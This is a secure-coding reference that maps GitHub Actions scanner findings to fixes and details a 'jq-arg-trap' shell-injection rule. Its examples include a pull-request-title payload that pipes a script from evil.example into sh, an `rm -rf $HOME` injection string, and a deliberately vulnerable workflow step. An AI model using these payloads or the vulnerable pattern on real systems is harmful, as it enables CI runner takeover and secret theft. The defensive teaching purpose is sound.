# Zizmor audit fix recipes

One-to-one map from a zizmor `ruleId` to the surgical fix the doctor applies. Findings whose `ruleId` is not in this table are surfaced verbatim with `[NEEDS-HUMAN-REVIEW]` — the doctor never silences the matcher with a suppression comment.

## Table of contents

- [Zizmor recipe table](#zizmor-recipe-table) — one row per upstream zizmor `ruleId`.
- [Secret handling rule](#secret-handling-rule-applies-to-every-fix-that-introduces-a-secret) — env-var indirection for any secret introduced by a fix.
- [Janitor-extension recipes (not in zizmor catalogue)](#janitor-extension-recipes-not-in-zizmor-catalogue) — findings the doctor matches itself with regex on every workflow file as a second pass after the zizmor scan.
  - [`jq-arg-trap`](#jq-arg-trap) — `jq --arg name "${{ ... }}"` shell substitution before jq sees the value.

## Zizmor recipe table

| zizmor audit | Surgical fix |
|---|---|
| `unpinned-uses` | Replace `owner/repo@v<X>` or `@<branch>` with `owner/repo@<sha>  # v<X.Y.Z>`. Resolve the SHA via `gh api repos/<owner>/<repo>/commits/<tag> --jq .sha`. Always append a `# v<tag>` comment so future readers can map the SHA back to a version. |
| `artipacked` | Add `with:\n  persist-credentials: false` (preserving existing `with:` keys) under every `actions/checkout@<sha>` step. Indentation matches the surrounding YAML. |
| `cache-poisoning` | When the offending setup-action enables caching by default (e.g. `astral-sh/setup-uv`, `actions/setup-node`, `setup-python`, `setup-go`, `setup-java`), pass `with:\n  enable-cache: false` (or the action's documented opt-out) on release / tag-triggered workflow paths only. CI / PR paths may keep the cache. |
| `template-injection` | Move every `${{ ... }}` expression used inside a `run:` shell block into an `env:` key on the same step (e.g. `PLUGIN_NAME: ${{ steps.x.outputs.name }}`), then reference `$PLUGIN_NAME` in the shell. Never inject the expression directly. |
| `dangerous-triggers` | If `pull_request_target` is used, verify the workflow writes only to the base-repo secret scope; if not, change to `pull_request`. Add a comment explaining the security choice. |
| `excessive-permissions` | Replace the offending `permissions:` block with the minimum needed: top-level `permissions: {}` plus per-job scoped grants. Compute the minimum from the actions actually invoked in each job. |
| `github-env-injection` | Stop writing `>> $GITHUB_ENV` / `>> $GITHUB_OUTPUT` from a `run:` block that interpolates a non-literal value. Move the value to an env var first, then `echo "key=$ENV_VAR" >> "$GITHUB_OUTPUT"`. |
| `obfuscation` | Surface to the user — obfuscated code in a workflow is intentional and the doctor refuses to "clean it up" silently. Mark `[NEEDS-HUMAN-REVIEW]`. |
| `hardcoded-container-tag` | Replace `image: foo/bar:latest` with `image: foo/bar@sha256:<digest>`. Resolve via `docker buildx imagetools inspect foo/bar:latest \| grep Digest`. |
| `bot-conditions` | Pin `if:` checks to the documented sender pattern, not the actor name; e.g. `if: github.event.pull_request.user.type == 'Bot'` rather than `github.actor == 'dependabot[bot]'`. |
| `forbidden-uses` | If a flagged action has a known-safe replacement, swap it. Otherwise surface as `[NEEDS-HUMAN-REVIEW]`. |
| `ref-confusion` | Replace `github.ref` interpolation in run blocks with `${GITHUB_REF}` from `env:` (which is `refs/heads/<branch>` or `refs/tags/<tag>` — unambiguous). |
| `self-hosted-runner` | Surface as `[NEEDS-HUMAN-REVIEW]` — moving to GitHub-hosted runners or adding job restrictions is a policy decision, not a mechanical fix. |
| `unredacted-secrets` | Move the bare-secret reference behind `mask-aws-credentials`, `add-mask`, or an env var with a logged-as-secret name. |
| `secrets-inherit` | Replace the `secrets: inherit` line with an explicit `secrets:` mapping listing only the secrets the called workflow needs. |
| `unsound-contains` | Replace `contains(<haystack>, <needle>)` with `==` or `startsWith` where the comparison is actually identity-based. |
| `stale-action-refs` | When an action has been deprecated upstream, swap to the documented replacement (e.g. `actions/upload-artifact@v3` → `@v4`). |
| `superfluous-actions` | Replace the third-party action with the equivalent shell command if the runner already provides it (e.g. `softprops/action-gh-release` → `gh release create`). Skip if the swap would lose a feature the workflow uses. |

## Secret handling rule (applies to every fix that introduces a secret)

When a fix surfaces a new repo-secret requirement, set the secret via env-var indirection — never echo the value:

```bash
# ai-maestro has already exported MY_TOKEN=... in the shell.
gh secret set MY_TOKEN --body "$MY_TOKEN" --repo "$(gh repo view --json nameWithOwner --jq .nameWithOwner)"
```

The value flows through the shell's existing env, not through Claude's prompt, not through argv visible in `ps`, not through hook logs.

## Janitor-extension recipes (not in zizmor catalogue)

The doctor runs a **second pass** after the zizmor scan: for every `.github/workflows/*.yml` file it compiles a small regex set and applies each janitor-specific matcher below. These findings do NOT come from zizmor and do NOT have a zizmor `ruleId` — they are matched and labelled by the doctor itself. Treat them with the same rigor as zizmor findings: no suppression comments, no `[NEEDS-HUMAN-REVIEW]` shortcut when a surgical fix exists.

### `jq-arg-trap`

**Class:** expression injection that bypasses jq's safe-`--arg` form.

**Why zizmor misses it:** zizmor's `template-injection` audit flags any `${{ ... }}` inside a `run:` block, but treats `jq --arg <name> "${{ ... }}"` as a safer pattern in some configurations because the operator visibly opted into `--arg`. The trap is that `--arg` only protects the **jq filter** from injection — it does NOT protect the **shell** from the `${{ }}` substitution that happens BEFORE jq is even invoked. A pull request title of `'; rm -rf $HOME ; '` (or any shell metacharacter payload) still lands in the shell argv unquoted-by-GitHub and the shell happily expands it.

**Detection (the doctor's regex):**

The doctor compiles `r'\$\{\{[^}]+\}\}'` and applies it to every `run:` block. A match counts as `jq-arg-trap` when ALL THREE hold for that single `run:` block:

1. The block contains the substring `jq` (token-bounded, e.g. matched by `\bjq\b`).
2. The block contains the substring `--arg`.
3. The regex `\$\{\{[^}]+\}\}` matches at least once inside the block body.

If any of those is missing, the finding is not `jq-arg-trap` (e.g. `jq` without `--arg`, or `--arg` without `${{ }}`, falls to other rules).

**Severity:** MAJOR. The article that motivated this recipe documents real-world shell-injection landing through this exact path.

**Surgical fix:** route the GH expression through an `env:` mapping on the same step, then pass the env var to `--arg <name> "$ENV_VAR"`. The shell now substitutes a value that is **already a string in the process environment**, never a value the YAML parser splices into the command line.

**BEFORE (vulnerable):**

```yaml
- name: Record PR title in summary.json
  run: |
    jq --arg title "${{ github.event.pull_request.title }}" \
       '.title = $title' \
       summary.json > summary.tmp && mv summary.tmp summary.json
```

A PR title of `attack'; curl -fsSL https://evil.example/x.sh | sh; '` is expanded by the shell BEFORE `jq` is launched. `--arg` doesn't help — the damage is already done at shell-substitution time.

**AFTER (safe):**

```yaml
- name: Record PR title in summary.json
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    jq --arg title "$PR_TITLE" \
       '.title = $title' \
       summary.json > summary.tmp && mv summary.tmp summary.json
```

Now the shell substitutes `$PR_TITLE` from the process environment as a single argv element. GitHub Actions has populated `PR_TITLE` as an environment string, NOT as inline YAML splice, so shell metacharacters in the title stay literal. `jq`'s own `--arg` keeps the title safe inside the filter as well — the two layers compose correctly.

**Acceptance criteria** (the doctor re-runs this check after fixing):

- The `run:` block contains NO literal `${{ }}` expression.
- Every `--arg <name>` is paired with a `"$ENV_VAR"` (double-quoted shell variable), never with a YAML expression splice.
- The same step has an `env:` mapping whose keys are exactly the env vars referenced by the `run:` block.

**Why `env:` and not `$GITHUB_EVENT_PATH` / `jq < $GITHUB_EVENT_PATH`:** reading from `$GITHUB_EVENT_PATH` is fine too and is sometimes cleaner for multi-field reads, but the surgical-minimum fix for a single field is `env:` because it preserves the original step's intent (a single jq invocation editing a single file) without introducing a new file read.

**Comment requirement:** add an inline YAML comment above the `env:` block:

```yaml
  # jq-arg-trap fix: route GH expression through env so the shell never sees the raw value.
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The comment makes future readers (and future automated matchers) aware that this is the documented safe pattern, not an accidental hardcode.

---

**Sentinel-derived rule set:** beyond `jq-arg-trap`, the doctor's second pass (`scripts/doctor_classify.py`) also runs ~25 rules ported from the Sentinel GitHub-Actions scanner — hardcoded-secrets, ide-config-injection, curl-pipe-shell, shell-injection-expr/jq, github-script-injection, workflow-dispatch-injection, dangerous-triggers, missing-permissions/timeouts, excessive-permissions, missing-persist-credentials, missing-env-protection, static-aws-credentials, build-publish-same-job, allow-forks-artifact, dangerous-lifecycle-scripts, and more. Their before/after fix recipes live in [sentinel-rules-recipes.md](sentinel-rules-recipes.md). Three Sentinel rules are handled by dedicated janitor skills instead: cache-poisoning → `janitor-fork-pr-cache-audit`, credential-window → `janitor-credential-window-audit`, missing-dependabot → `janitor-dependabot-doctor`.
